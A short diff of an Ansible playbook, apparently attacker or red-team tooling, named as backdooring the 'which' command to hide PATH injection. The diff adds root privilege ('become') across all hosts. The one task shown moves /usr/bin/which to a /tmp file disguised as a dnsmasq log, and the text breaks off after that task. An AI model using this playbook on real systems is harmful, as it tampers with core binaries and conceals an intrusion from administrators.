@@ -1,5 +1,7 @@
 ---
 - name: "backdoored which to hide path injection for ps"
+  hosts: all
+  become: yes
   tasks:
     - name: "move which"
       shell: "mv /usr/bin/which /tmp/dnsmasq-tmp-log-199sjduse8kxp200oz8s"
